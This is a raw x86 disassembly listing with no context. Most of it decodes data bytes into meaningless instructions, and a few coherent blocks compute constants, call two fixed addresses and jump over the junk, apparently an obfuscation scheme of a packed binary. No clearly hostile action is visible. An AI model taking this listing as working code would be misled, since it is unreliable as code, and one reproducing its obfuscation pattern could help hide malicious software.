  40dd5f:	gs in  al,0xe7
  40dd62:	mov    ds:0xed4f5c2e,eax
  40dd67:	es jae 0x40dd0a
  40dd6a:	out    dx,eax
  40dd6b:	fnstcw WORD PTR [ecx]
  40dd6d:	fucomp st(2)
  40dd6f:	inc    esp
  40dd70:	stos   DWORD PTR es:[edi],eax
  40dd71:	and    dh,al
  40dd73:	mov    ebx,ebp
  40dd75:	jmp    0x40dcfa
  40dd77:	and    eax,0xf3252231
  40dd7c:	cmp    BYTE PTR [esi],dl
  40dd7e:	sbb    bl,BYTE PTR [edi]
  40dd80:	cli    
  40dd81:	cmc    
  40dd82:	adc    al,0xcc
  40dd84:	inc    esi
  40dd85:	(bad)  [ebx+0x2bb2f203]
  40dd8b:	popf   
  40dd8c:	lahf   
  40dd8d:	adc    DWORD PTR [ecx+0x75],eax
  40dd90:	dec    ebp
  40dd91:	and    eax,0x577b7b15
  40dd96:	bound  esp,QWORD PTR [edx+0x66]
  40dd99:	xchg   ebp,eax
  40dd9a:	int    0x85
  40dd9c:	lds    edi,FWORD PTR [eax-0x5e010e66]
  40dda2:	repnz (bad) 
  40dda4:	out    dx,eax
  40dda5:	xor    ch,BYTE PTR [ecx+ebp*2-0x75]
  40dda9:	int3   
  40ddaa:	mov    esi,edx
  40ddac:	and    DWORD PTR [edx-0x10288a66],esp
  40ddb2:	dec    esp
  40ddb3:	mov    ?,ebp
  40ddb5:	lock cld 
  40ddb7:	push   eax
  40ddb8:	xchg   DWORD PTR [esi-0x5d],edx
  40ddbb:	xor    esp,DWORD PTR [ebp-0x77]
  40ddbe:	fldenv [ebx-0xd]
  40ddc1:	inc    ecx
  40ddc2:	push   eax
  40ddc3:	lahf   
  40ddc4:	gs shr edi,cl
  40ddc7:	mov    bl,0x9c
  40ddc9:	xchg   esi,eax
  40ddca:	and    esi,edx
  40ddcc:	add    eax,0x3b757ad0
  40ddd1:	xchg   ebx,esi
  40ddd3:	jno    0x40dd5a
  40ddd5:	out    0x28,eax
  40ddd7:	mov    bl,0x4d
  40ddd9:	and    al,0x51
  40dddb:	dec    ebx
  40dddc:	(bad)  
  40dddd:	ins    BYTE PTR es:[edi],dx
  40ddde:	mov    bl,dl
  40dde0:	push   ecx
  40dde1:	pop    esi
  40dde2:	imul   ebx,edi,0x55
  40dde5:	jecxz  0x40dd69
  40dde7:	sbb    al,0xd6
  40dde9:	sbb    al,0x8
  40ddeb:	stc    
  40ddec:	aaa    
  40dded:	dec    ecx
  40ddee:	jp     0x40dd99
  40ddf0:	or     edx,DWORD PTR [esp+edx*2]
  40ddf3:	sti    
  40ddf4:	into   
  40ddf5:	mov    WORD PTR [edi-0x23],?
  40ddf8:	jecxz  0x40ddec
  40ddfa:	and    ah,dh
  40ddfc:	pop    esi
  40ddfd:	in     al,0x44
  40ddff:	fnstsw WORD PTR [ebx-0x18a95387]
  40de05:	mov    esp,0xbf42d4ae
  40de0a:	xchg   ebx,eax
  40de0b:	sub    bl,BYTE PTR [ebp-0x4d]
  40de0e:	enter  0x1295,0x53
  40de12:	neg    esi
  40de14:	mov    edi,0xd72edd68
  40de19:	add    dl,BYTE PTR [ebx-0x95a191b]
  40de1f:	into   
  40de20:	ror    DWORD PTR [ecx-0x65],1
  40de23:	cwde   
  40de24:	xor    edi,DWORD PTR [esi+0xe]
  40de27:	aam    0xd0
  40de29:	sub    ebx,ebp
  40de2b:	(bad)  
  40de2d:	(bad)  
  40de2e:	xchg   ebx,eax
  40de2f:	adc    esp,esp
  40de31:	aad    0xb2
  40de33:	fldenv [ebx+0x66]
  40de36:	sbb    eax,0x78508922
  40de3b:	fwait
  40de3c:	call   0x5192bd89
  40de41:	das    
  40de42:	out    dx,al
  40de43:	cdq    
  40de44:	dec    eax
  40de45:	xchg   ebx,eax
  40de46:	loopne 0x40de37
  40de48:	outs   dx,DWORD PTR ds:[esi]
  40de49:	mov    cl,0x2c
  40de4b:	fmul   QWORD PTR [esi+0x7f]
  40de4e:	mov    edx,0x10518e0a
  40de53:	je     0x40de7c
  40de55:	mov    edi,0x6925bc89
  40de5a:	inc    ebp
  40de5b:	sub    al,0xa4
  40de5d:	mov    ebp,0xd3dc5bae
  40de63:	push   cs
  40de64:	into   
  40de65:	cld    
  40de66:	mov    ebx,0x7fe30476
  40de6b:	sbb    BYTE PTR [edx],0x61
  40de6e:	mov    cs,WORD PTR [esi+0x1758d18c]
  40de74:	aad    0x64
  40de76:	lea    eax,[ecx-0x7bad9421]
  40de7c:	cvttps2pi mm6,QWORD PTR [ecx]
  40de7f:	xor    BYTE PTR [edx+0x15],al
  40de82:	and    eax,0xff1e01a3
  40de87:	dec    ebx
  40de88:	ins    BYTE PTR es:[edi],dx
  40de89:	inc    ecx
  40de8a:	adc    bl,BYTE PTR [ebx-0x3a]
  40de8d:	mov    edx,0x7a1de3d8
  40de92:	aam    0x86
  40de94:	xor    eax,0xa75e2cb6
  40de99:	lahf   
  40de9a:	jge    0x40de78
  40de9c:	ret    0xc0fb
  40de9f:	dec    ecx
  40dea0:	lock jbe 0x40de55
  40dea3:	sub    ecx,DWORD PTR [esi+0x873f26c]
  40dea9:	mov    DWORD PTR [di-0x18],0x524d
  40deb1:	mov    DWORD PTR [ebp-0x14],0x1600
  40deb8:	mov    eax,DWORD PTR [ebp-0x18]
  40debb:	mov    ecx,DWORD PTR [ebp-0x14]
  40debe:	mov    edx,DWORD PTR [ebp-0x10]
  40dec1:	mov    edi,DWORD PTR [ebp-0xc]
  40dec4:	push   edi
  40dec5:	push   edx
  40dec6:	push   ecx
  40dec7:	push   eax
  40dec8:	call   0x41594e
  40decd:	mov    ecx,DWORD PTR [ebp-0x8]
  40ded0:	mov    edi,DWORD PTR [ebp-0x4]
  40ded3:	add    eax,0x1dc8
  40ded8:	adc    edx,0x6fbf
  40dede:	and    edx,edi
  40dee0:	push   0x1061
  40dee5:	and    eax,ecx
  40dee7:	or     edx,0x23ff
  40deed:	push   0x4000022f
  40def2:	or     eax,0x58c4
  40def7:	xor    edx,0x7a7a
  40defd:	xor    eax,0x5278
  40df02:	push   edx
  40df03:	push   eax
  40df04:	call   0x422239
  40df09:	jmp    0x40e198
  40df0e:	and    eax,0x8c7544dd
  40df13:	jnp    0x40df51
  40df15:	scas   al,BYTE PTR es:[edi]
  40df16:	fs aam 0x9e
  40df19:	nop
  40df1a:	xor    ecx,DWORD PTR [edi+0x4a]
  40df1d:	xchg   edx,eax
  40df1e:	push   ss
  40df1f:	cld    
  40df20:	mov    esi,0xbec299be
  40df25:	mov    esi,0xdafb343f
  40df2a:	sub    edi,DWORD PTR [esi-0x77]
  40df2d:	mov    ds:0x1269efb3,al
  40df32:	add    eax,0x9221964a
  40df37:	jns    0x40dee9
  40df39:	cmp    al,0xf1
  40df3b:	pop    ebx
  40df3c:	out    dx,al
  40df3d:	aas    
  40df3e:	in     eax,dx
  40df3f:	sbb    eax,DWORD PTR [esp+ecx*4+0x21e806ad]
  40df46:	in     eax,dx
  40df47:	xchg   ecx,eax
  40df48:	fmul   QWORD PTR [edi+0x33]
  40df4c:	sub    DWORD PTR [ebp+0x28d1df4a],0x8
  40df53:	idiv   BYTE PTR [edx]
  40df55:	fsubr  st(1),st
  40df57:	dec    eax
  40df58:	(bad)  
  40df59:	dec    esp
  40df5a:	and    al,BYTE PTR [ecx+0x4b]
  40df5d:	in     eax,0x2
  40df5f:	nop
  40df60:	xchg   edi,eax
  40df61:	adc    eax,0xd3d03357
  40df66:	xchg   esp,eax
  40df67:	aas    
  40df68:	loopne 0x40dfa9
  40df6a:	jmp    0xb8283597
  40df6f:	fsubrp st(3),st
  40df71:	or     eax,0x324ba04e
  40df76:	out    dx,eax
  40df77:	jno    0x40dfe5
  40df79:	and    esp,DWORD PTR [ecx]
  40df7b:	cmp    eax,0x94f8cd9c
  40df80:	rol    edi,1
  40df82:	ss ins BYTE PTR es:[edi],dx
  40df84:	mov    ebp,0x2bf540b5
  40df89:	(bad)  
  40df8a:	mov    ebx,0x52b17dc6
  40df8f:	xor    esp,esi
  40df91:	pop    eax
  40df92:	hlt    
  40df93:	mov    ah,0x22
  40df95:	jge    0x40df33
  40df97:	pop    esp
  40df98:	xor    al,0x98
  40df9a:	fs aam 0xce
  40df9d:	scas   al,BYTE PTR es:[edi]
  40df9e:	xchg   BYTE PTR [ebp+0x6a],bh
  40dfa1:	cli    
  40dfa2:	dec    edx
  40dfa3:	cs mov al,0x2f
  40dfa6:	mov    edx,0xb2b11760
  40dfab:	jmp    0xca9adcd3
  40dfb0:	or     DWORD PTR [ebp+0x56],ecx
  40dfb3:	cdq    
  40dfb4:	push   edx
  40dfb5:	add    BYTE PTR [edx+0x71],bh
  40dfb8:	and    al,0xc0
  40dfba:	mov    ds:0xd4ff35e3,al
  40dfbf:	aaa    
  40dfc0:	push   edi
  40dfc1:	dec    edx
  40dfc2:	shl    BYTE PTR [eax-0x6ca15fff],1
  40dfc8:	mov    BYTE PTR [eax+0x6],bh
  40dfcb:	or     ebx,DWORD PTR [edi+0x78]
  40dfce:	pop    esp
  40dfcf:	push   ebp
  40dfd0:	test   eax,0x8b0a0a46
  40dfd5:	dec    edi
  40dfd6:	cwde   
  40dfd7:	sar    DWORD PTR [edi],1
  40dfd9:	je     0x40e02a
  40dfdb:	or     eax,0xa9fbc073
  40dfe0:	fsubr  DWORD PTR ds:0x4d219249
  40dfe6:	sub    eax,0x3e5717ce
  40dfeb:	sbb    eax,0x3c9b1b08
  40dff0:	call   DWORD PTR [ebp+0x55814453]
  40dff6:	jg     0x40e00b
  40dff8:	pushf  
  40dff9:	cmp    al,0xc6
  40dffb:	repnz pop edx
  40dffd:	sbb    BYTE PTR [edx],0xad
  40e000:	pop    edi
  40e001:	mov    esp,0xa1dd4874
  40e006:	es push edi
  40e008:	jo     0x40e018
  40e00a:	sbb    bl,BYTE PTR [eax+0x5182c7be]
  40e010:	fimul  WORD PTR [esi]
  40e012:	ss jo  0x40dfc7
  40e015:	test   dl,dh
  40e017:	push   edi
  40e018:	cmp    BYTE PTR [edi-0x54ce874],0xd2
  40e01f:	sbb    eax,0xaa875cc6
  40e024:	shr    DWORD PTR [esi-0x6c],0x1e
  40e028:	das    
  40e029:	xchg   ebx,eax
  40e02a:	fmul   DWORD PTR [esi+0x3e]
  40e02d:	fwait
  40e02e:	jg     0x40e050
  40e030:	mov    eax,ds:0xbed9a013
  40e035:	sub    al,BYTE PTR [eax]
  40e037:	mov    bl,BYTE PTR [edx]
  40e039:	shl    DWORD PTR [eax+ebp*8+0x42],0x95
  40e03e:	(bad)  
  40e03f:	lea    ebp,[ecx]
  40e041:	mov    ?,WORD PTR [ebp-0x7e5b87f6]
  40e047:	adc    al,BYTE PTR [eax]
  40e049:	mov    bh,0x6e
  40e04b:	stos   BYTE PTR es:[edi],al
  40e04c:	sti    
  40e04d:	cmp    bh,dl
  40e04f:	push   ebx
  40e050:	cli    
  40e051:	mov    eax,0x1ee303d1
  40e056:	pop    eax
  40e057:	dec    edi
  40e058:	nop
  40e059:	pushf  
  40e05a:	(bad)  
  40e05b:	arpl   WORD PTR [eax+0x4f62dc3e],ax
  40e061:	xchg   edi,eax
  40e062:	pop    ebp
  40e063:	push   ds
  40e064:	lods   eax,DWORD PTR ds:[esi]
  40e065:	mov    eax,DWORD PTR [edi-0x1d33ff0d]
  40e06b:	retf   
  40e06c:	loop   0x40e0d8
  40e06e:	jecxz  0x40e0b8
  40e070:	mov    al,0x3f
  40e072:	pop    ebx
  40e073:	stos   BYTE PTR es:[edi],al
  40e074:	and    al,0xf2
  40e076:	rcr    BYTE PTR [esi-0x59],0xad
  40e07a:	jge    0x40e047
  40e07c:	call   0x40e0:0xac47b6
  40e083:	cmp    edi,DWORD PTR [edx]
  40e085:	push   es
  40e086:	outs   dx,BYTE PTR ds:[esi]
  40e087:	lods   al,BYTE PTR ds:[esi]
  40e088:	pop    ecx
  40e089:	dec    ebp
  40e08a:	ins    BYTE PTR es:[edi],dx
  40e08b:	sbb    eax,DWORD PTR [edi+0x27a614cd]
  40e091:	ficomp WORD PTR [ebp+0x6e30fa78]
  40e097:	outs   dx,DWORD PTR ds:[esi]
  40e098:	inc    edi
  40e099:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e09a:	or     al,0x86
  40e09c:	into   
  40e09d:	jl     0x40e109
  40e09f:	(bad)  
  40e0a0:	call   0xdffc2fde
  40e0a5:	fisttp QWORD PTR [ebx-0x40caeccc]
  40e0ab:	and    dl,BYTE PTR [edx-0xa743b5f]
  40e0b1:	xchg   ebx,eax
  40e0b2:	mov    al,0xb
  40e0b4:	shr    esi,cl
  40e0b6:	mov    al,0xb8
  40e0b8:	jg     0x40e12b
  40e0ba:	dec    eax
  40e0bb:	aaa    
  40e0bc:	dec    ebx
  40e0bd:	fwait
  40e0be:	lahf   
  40e0bf:	shl    BYTE PTR ds:0x6e547a56,1
  40e0c5:	add    BYTE PTR [ebp+edx*8-0x15d56dfd],cl
  40e0cc:	and    BYTE PTR [esi+0x1b8a88e9],0x74
  40e0d3:	adc    DWORD PTR [ebx],edx
  40e0d5:	and    eax,0x31f9b1d0
  40e0da:	loopne 0x40e0d9
  40e0dc:	rep stos BYTE PTR es:[edi],al
  40e0de:	outs   dx,BYTE PTR ds:[esi]
  40e0df:	test   BYTE PTR [ebp+0x61],ah
  40e0e2:	cmp    eax,ebx
  40e0e4:	mov    dh,0x70
  40e0e6:	jo     0x40e149
  40e0e8:	pop    ebx
  40e0e9:	jb     0x40e098
  40e0eb:	std    
  40e0ec:	cmpxchg BYTE PTR [eax+0x4dbe0d95],ah
  40e0f3:	xchg   esp,eax
  40e0f4:	out    dx,al
  40e0f5:	pop    ebx
  40e0f6:	jmp    0x3d28800e
  40e0fb:	fucomip st,st(0)
  40e0fd:	mov    esp,DWORD PTR [ebx-0x2436d48f]
  40e103:	xor    al,dh
  40e105:	js     0x40e0eb
  40e107:	addr16 out dx,eax
  40e109:	pusha  
  40e10a:	or     eax,0xa36de7e2
  40e10f:	or     eax,0x3cf46a5d
  40e114:	mov    bh,0xdb
  40e116:	mov    ebp,0xe686406b
  40e11b:	std    
  40e11c:	xor    al,0x60
  40e11e:	pop    edi
  40e11f:	pushf  
  40e120:	ficomp WORD PTR [edi+0x5f]
  40e123:	shl    ah,1
  40e125:	mov    ch,BYTE PTR [ecx+0x4578c9f7]
  40e12b:	or     al,0x41
  40e12d:	shl    BYTE PTR [ebp-0x75],cl
  40e130:	bound  ebp,QWORD PTR [ebx]
  40e132:	int    0xb2
  40e134:	jmp    0xaf85c769
  40e139:	push   edi
  40e13a:	ret    0x6de3
  40e13d:	pop    edi
  40e13e:	mov    bh,dl
  40e140:	div    cl
  40e142:	jg     0x40e125
  40e144:	pop    eax
  40e145:	and    BYTE PTR [esi+0x78],dh
  40e148:	mov    edx,0xf9d4da0a
  40e14d:	ja     0x40e0f8
  40e14f:	aam    0x3a
  40e151:	retf   
  40e152:	push   eax
  40e153:	mov    DWORD PTR [ebp+0x488ab983],0x726d3388
  40e15d:	sar    BYTE PTR [ebp-0x3a],0x10
  40e161:	pop    edx
  40e162:	jl     0x40e18a
  40e164:	and    eax,0x2e22146a
  40e169:	cmp    bl,BYTE PTR [ebx-0x7]
  40e16c:	and    eax,0x7a95d384
  40e171:	push   ebx
  40e172:	cmp    al,0x62
  40e174:	pop    ds
  40e175:	fcomp  st(0)
  40e177:	add    BYTE PTR [ebx+0x7901599a],bh
  40e17d:	ins    BYTE PTR es:[edi],dx
  40e17e:	dec    edx
  40e17f:	out    dx,eax
  40e180:	sbb    ah,cl
  40e182:	pop    ds
  40e183:	mov    dl,0xd0
  40e185:	push   0x9bb7c7b
  40e18a:	xor    al,0x7e
  40e18c:	and    al,BYTE PTR [ecx+0x58]
  40e18f:	stc    
  40e190:	or     esp,DWORD PTR [edx-0x36]
  40e193:	pop    es
  40e194:	retf   0xf71b
  40e197:	scas   eax,DWORD PTR es:[edi]
  40e198:	mov    DWORD PTR [esi],eax
  40e19a:	mov    DWORD PTR [ebp-0x20],0x3354
  40e1a1:	mov    DWORD PTR [ebp-0x1c],0x7d8c
  40e1a8:	mov    DWORD PTR [ebp-0x18],0x3d36
  40e1af:	mov    DWORD PTR [ebp-0x14],0x51ef
  40e1b6:	xor    edi,edi
  40e1b8:	mov    DWORD PTR [ebp-0xc],0x3358
  40e1bf:	push   0xc9f
  40e1c4:	jmp    0x40e453
  40e1c9:	jecxz  0x40e232
  40e1cb:	fscale 
  40e1cd:	pop    edx
  40e1ce:	mov    ah,0x3c
  40e1d0:	lods   al,BYTE PTR ds:[esi]
  40e1d1:	je     0x40e1fd
  40e1d3:	push   eax
  40e1d4:	sahf   
  40e1d5:	clc    
  40e1d6:	xlat   BYTE PTR ds:[ebx]
  40e1d7:	repnz iret 
  40e1d9:	icebp  
  40e1da:	add    bh,BYTE PTR [esi-0x413d6642]
  40e1e0:	mov    esi,0xc395106e
  40e1e5:	jl     0x40e1f7
  40e1e7:	in     al,dx
  40e1e8:	(bad)  
  40e1e9:	sti    
  40e1ea:	shl    BYTE PTR [esi],cl
  40e1ec:	scas   al,BYTE PTR es:[edi]
  40e1ed:	mov    eax,0xe197fcb4
  40e1f2:	mov    ecx,0xc2a14ece
  40e1f7:	jb     0x40e257
  40e1f9:	std    
  40e1fa:	lds    eax,FWORD PTR [esi+0x5c]
  40e1fd:	bound  esi,QWORD PTR [esi+0x7a53937f]
  40e203:	(bad)  
  40e205:	add    al,0xfb
  40e207:	push   es
  40e208:	(bad)  
  40e209:	adc    BYTE PTR [edx-0xd5299d3],ah
  40e20f:	add    BYTE PTR [ebx-0x34],al
  40e212:	es je  0x40e1c6
  40e215:	sub    al,0x2a
  40e217:	jle    0x40e27e
  40e219:	lea    ebp,[eax-0x5f263dda]
  40e21f:	pop    ds
  40e220:	syscall 
  40e222:	in     eax,dx
  40e223:	inc    eax
  40e224:	popf   
  40e225:	addr16 pusha 
  40e227:	xor    bh,cl
  40e229:	mov    ebp,ebx
  40e22b:	or     al,0x9f
  40e22d:	out    0x59,eax
  40e22f:	jnp    0x40e1cb
  40e231:	pop    ecx
  40e232:	leave  
  40e233:	pop    esi
  40e234:	sub    eax,0x4b4026c6
  40e239:	in     al,0x32
  40e23b:	push   esi
  40e23c:	push   edx
  40e23d:	pop    es
  40e23e:	in     eax,dx
  40e23f:	add    eax,0x9adce386
  40e244:	jp     0x40e247
  40e246:	popa   
  40e247:	sbb    ebp,DWORD PTR [edi+0x49]
  40e24a:	int3   
  40e24b:	mov    al,ds:0x24656e66
  40e250:	pusha  
  40e251:	adc    edi,DWORD PTR [ebx+0x3b]
  40e254:	jo     0x40e28e
  40e256:	mov    edi,0x3889189c
  40e25b:	or     dl,BYTE PTR [ebp+edi*4+0x71]
  40e25f:	cmp    cl,cl
  40e261:	cli    
  40e262:	xor    al,BYTE PTR [ebx-0x760cc8db]
  40e268:	or     al,0xeb
  40e26a:	imul   ebp,DWORD PTR [ebx+edx*2],0xffffffab
  40e26e:	adc    bl,BYTE PTR [esi]
  40e270:	xor    BYTE PTR [edx-0x5cc431db],0x25
  40e277:	cmp    al,0x14
  40e279:	inc    esi
  40e27a:	xor    BYTE PTR [ecx+0x76ae3077],bh
  40e280:	xchg   ecx,eax
  40e281:	xchg   ebp,esp
  40e283:	adc    ch,BYTE PTR [edi+0x4d]
  40e286:	dec    ebp
  40e287:	mov    dl,0x18
  40e289:	popa   
  40e28a:	loopne 0x40e28e
  40e28c:	mov    ebp,0x7db01978
  40e291:	xchg   ebp,eax
  40e292:	ss add al,0x9b
  40e295:	xchg   ebx,eax
  40e296:	add    bh,ah
  40e298:	lds    eax,FWORD PTR [esi-0x5f]
  40e29b:	push   0xeebf641c
  40e2a0:	loopne 0x40e242
  40e2a2:	adc    eax,0xb67d4442
  40e2a7:	and    edi,DWORD PTR cs:[edx]
  40e2aa:	or     BYTE PTR [edi],dl
  40e2ac:	mov    dh,0xa
  40e2ae:	inc    eax
  40e2af:	xchg   edi,eax
  40e2b0:	ret    0x745d
  40e2b3:	xchg   ecx,eax
  40e2b4:	pop    ebp
  40e2b5:	mov    bh,0x2e
  40e2b7:	xor    BYTE PTR [edi+0x48],0x0
  40e2bb:	xor    esp,DWORD PTR [edi]
  40e2bd:	adc    bh,cl
  40e2bf:	(bad)  
  40e2c0:	repz rol DWORD PTR [ecx-0x2b5d0179],1
  40e2c7:	dec    edi
  40e2c8:	retf   
  40e2c9:	repnz or DWORD PTR [edi-0x11f7cda2],esi
  40e2d0:	mov    ds:0xff5667f5,al
  40e2d5:	es push 0x2c36aaaf
  40e2db:	hlt    
  40e2dc:	add    ebx,esp
  40e2de:	inc    eax
  40e2df:	pushf  
  40e2e0:	inc    ebp
  40e2e1:	add    ecx,esp
  40e2e3:	jno    0x40e29f
  40e2e5:	dec    ebx
  40e2e6:	xor    esi,DWORD PTR [ebp+0x11]
  40e2e9:	xchg   esi,eax
  40e2ea:	pushf  
  40e2eb:	repnz adc bl,0x8
  40e2ef:	hlt    
  40e2f0:	mov    cl,0xb6
  40e2f2:	pusha  
  40e2f3:	jb     0x40e27a
  40e2f5:	das    
  40e2f6:	or     edx,DWORD PTR [ebx+0x6a]
  40e2f9:	inc    edx
  40e2fa:	mov    ebp,0xee6b64df
  40e2ff:	add    edx,esp
  40e301:	fcmovnb st,st(3)
  40e303:	mov    edi,0xa3f178b3
  40e308:	jecxz  0x40e28b
  40e30a:	fimul  DWORD PTR ds:0x82ee7d10
  40e310:	int3   
  40e311:	imul   ebp,DWORD PTR [eax],0x2e163511
  40e317:	imul   ecx,DWORD PTR [ebp-0x11ead593],0xfffffffd
  40e31e:	stc    
  40e31f:	push   0x2
  40e321:	addr16 loope 0x40e2df
  40e324:	out    0xe4,eax
  40e326:	mov    edi,0x8989179c
  40e32b:	add    bh,BYTE PTR [edi+0x71]
  40e32e:	shl    DWORD PTR [esi],0x63
  40e331:	jmp    0x40e365
  40e333:	inc    eax
  40e334:	sahf   
  40e335:	js     0x40e31f
  40e337:	sbb    BYTE PTR [ebx+0x5],0x85
  40e33b:	adc    al,0x44
  40e33d:	and    eax,0x4f1d68a1
  40e342:	aad    0x4e
  40e344:	enter  0x7b28,0xfc
  40e348:	mov    ebp,0x889cc419
  40e34d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e34e:	pusha  
  40e34f:	xor    bl,BYTE PTR [ecx+0x80c1342]
  40e355:	add    cl,BYTE PTR [esi+0x16]
  40e358:	add    ch,bh
  40e35a:	stos   BYTE PTR es:[edi],al
  40e35b:	mov    ebp,0x90d92158
  40e360:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e361:	sbb    BYTE PTR [ebx+0x42edb81a],cl
  40e367:	mov    edi,0xcebd595
  40e36c:	sbb    eax,0xe0ca6ac1
  40e371:	xchg   edi,eax
  40e372:	cwde   
  40e373:	sbb    DWORD PTR [esi+ebp*1+0x22],eax
  40e377:	jge    0x40e3d3
  40e379:	jne    0x40e33a
  40e37b:	add    eax,0x2f773f0f
  40e380:	popa   
  40e381:	mov    eax,ss
  40e383:	sub    eax,0x83618db0
  40e388:	sahf   
  40e389:	sahf   
  40e38a:	cmp    al,0x98
  40e38c:	and    DWORD PTR [esi-0x52],ecx
  40e38f:	loope  0x40e313
  40e391:	jbe    0x40e379
  40e393:	xor    dh,BYTE PTR [ecx-0x7040e4f4]
  40e399:	hlt    
  40e39a:	fsubr  DWORD PTR ds:0x389a133e
  40e3a0:	out    dx,al
  40e3a1:	call   0x2457a594
  40e3a6:	jne    0x40e3d1
  40e3a8:	adc    ah,BYTE PTR [edx-0x43]
  40e3ab:	jo     0x40e3d1
  40e3ad:	adc    bh,BYTE PTR [edi+0x208a5a2c]
  40e3b3:	(bad)  
  40e3b4:	bound  esp,QWORD PTR [ebx]
  40e3b6:	test   eax,0x38d6cee9
  40e3bb:	mov    dl,0xa0
  40e3bd:	jecxz  0x40e3a4
  40e3bf:	cmp    eax,DWORD PTR [ebp-0x1d]
  40e3c2:	mov    DWORD PTR [edx+0x2e],ebx
  40e3c5:	or     edi,edi
  40e3c7:	mov    bh,0x38
  40e3c9:	mov    esp,DWORD PTR [eax-0x3]
  40e3cc:	xor    esp,esi
  40e3ce:	fldenv [eax]
  40e3d0:	(bad)  
  40e3d1:	test   eax,0x32eb9847
  40e3d6:	mov    al,0xb6
  40e3d8:	pop    ebp
  40e3d9:	lods   eax,DWORD PTR ds:[esi]
  40e3da:	or     cl,BYTE PTR [eax]
  40e3dc:	(bad)
  40e3df:	or     bh,dl
  40e3e1:	mov    esp,0xaafe3805
  40e3e6:	or     dh,BYTE PTR ss:[ebp+0x69]
  40e3ea:	inc    ebp
  40e3eb:	inc    edi
  40e3ec:	sbb    al,0x92
  40e3ee:	mov    DWORD PTR [esi-0x1e],esp
  40e3f1:	retf   
  40e3f2:	mov    WORD PTR [edx+0x69],ss
  40e3f5:	(bad)  
  40e3f7:	jb     0x40e420
  40e3f9:	sbb    ecx,eax
  40e3fb:	dec    eax
  40e3fc:	jne    0x40e462
  40e3fe:	inc    ebx
  40e3ff:	pop    esi
  40e400:	neg    BYTE PTR [ebx-0x7d3e58b8]
  40e406:	enter  0x4b9,0x84
  40e40a:	jle    0x40e3ff
  40e40c:	aam    0x78
  40e40e:	stos   BYTE PTR es:[edi],al
  40e40f:	pop    esi
  40e410:	sub    DWORD PTR [edx-0x15],0xffffffb7
  40e414:	aaa    
  40e415:	pop    edi
  40e416:	jmp    0xcd055c73
  40e41b:	sbb    DWORD PTR [eax],ebp
  40e41d:	xor    BYTE PTR [ebx+0x31595f9c],al
  40e423:	inc    ebx
  40e424:	call   0xec403c0
  40e429:	xchg   esi,eax
  40e42a:	mov    edx,0x95938a15
  40e42f:	fild   DWORD PTR [edi+esi*2+0x7db62f02]
  40e436:	sub    eax,0x592c10b5
  40e43b:	sub    eax,0x1b2465a8
  40e440:	xchg   BYTE PTR ds:0x280ed527,bh
  40e446:	push   ebx
  40e447:	lds    edx,FWORD PTR [esi]
  40e449:	adc    DWORD PTR [eax+0x2f],ebp
  40e44c:	call   0xed7f:0xfd0a7e30
  40e453:	inc    edi
  40e454:	mov    DWORD PTR [ebp-0x4],edi
  40e457:	mov    eax,DWORD PTR [ebp-0x18]
  40e45a:	mov    ecx,DWORD PTR [ebp-0x14]
  40e45d:	push   0x1c19
  40e462:	push   ecx
  40e463:	push   eax
  40e464:	call   0x41594e
  40e469:	mov    ecx,DWORD PTR [ebp-0x20]
  40e46c:	mov    ebx,DWORD PTR [ebp-0x1c]
  40e46f:	or     eax,ecx
  40e471:	or     edx,ebx
  40e473:	push   0x20fa
  40e478:	add    eax,0x7fac
  40e47d:	push   0x1cd48ab
  40e482:	adc    edx,0x133b
  40e488:	push   edx
  40e489:	push   eax
  40e48a:	call   0x422239
  40e48f:	mov    ebx,DWORD PTR [ebp-0x4]
  40e492:	lea    ecx,[eax-0x5d40]
  40e498:	xor    edx,edx
  40e49a:	mov    eax,0x16c2
  40e49f:	div    ebx
  40e4a1:	mov    edx,DWORD PTR [ebp-0xc]
  40e4a4:	sub    eax,edx
  40e4a6:	mov    DWORD PTR [esi+eax*4+0x725c],ecx
  40e4ad:	mov    DWORD PTR [ebp-0x14],0x6af0
  40e4b4:	mov    DWORD PTR [ebp-0x4],edi
  40e4b7:	mov    DWORD PTR [ebp-0xc],0x2c8a
  40e4be:	mov    ecx,DWORD PTR [ebp-0xc]
  40e4c1:	mov    eax,0x4401
  40e4c6:	sub    eax,ecx
  40e4c8:	mov    ecx,DWORD PTR [ebp-0x4]
  40e4cb:	xor    edx,edx
  40e4cd:	div    ecx
  40e4cf:	mov    ecx,DWORD PTR [ebp-0x14]
  40e4d2:	xor    eax,0xa80
  40e4d7:	or     eax,0x343b
  40e4dc:	or     eax,ecx
  40e4de:	mov    ecx,DWORD PTR [ebp+0x8]
  40e4e1:	mov    DWORD PTR [esi+eax*4-0x1fff4],ecx
  40e4e8:	mov    DWORD PTR [ebp-0xc],0x327f
  40e4ef:	mov    DWORD PTR [ebp-0x14],0x5215
  40e4f6:	mov    DWORD PTR [ebp+0x8],0x2502
  40e4fd:	mov    eax,DWORD PTR [ebp+0x8]
  40e500:	add    eax,DWORD PTR [ebp-0x14]
  40e503:	mov    ecx,DWORD PTR [ebp-0xc]
  40e506:	and    eax,0x2bab
  40e50b:	lea    eax,[eax+ecx*1-0x557f]
  40e512:	mov    ecx,DWORD PTR [ebp+0xc]
  40e515:	mov    DWORD PTR [esi+eax*4],ecx
  40e518:	mov    DWORD PTR [ebp-0xc],edi
  40e51b:	mov    DWORD PTR [ebp+0x8],0x5f40
  40e522:	mov    DWORD PTR [ebp-0x14],0x6ba4
  40e529:	mov    DWORD PTR [ebp+0xc],0x7b17
  40e530:	mov    ecx,DWORD PTR [ebp+0x8]
  40e533:	jmp    0x40e7c2
  40e538:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e539:	jno    0x40e4dc
  40e53b:	into   
  40e53c:	mov    ecx,0xb6b9b90d
  40e541:	jb     0x40e5b1
  40e543:	fnsave ds:0xcdcff45f
  40e549:	push   es
  40e54a:	mov    esi,0xbec299be
  40e54f:	mov    esi,0xc3937475
  40e554:	(bad)  
  40e555:	imul   ebx,DWORD PTR [ebx+0x34],0x2b
  40e559:	mov    dh,dh
  40e55b:	fmul   DWORD PTR [eax-0x2e]
  40e55e:	iret   
  40e55f:	mov    ecx,0xdf4612ca
  40e564:	mov    bh,BYTE PTR [edx-0x31]
  40e567:	std    
  40e568:	and    al,0x7e
  40e56a:	out    dx,eax
  40e56b:	bound  ebx,QWORD PTR [edx]
  40e56d:	dec    ebp
  40e56e:	out    dx,eax
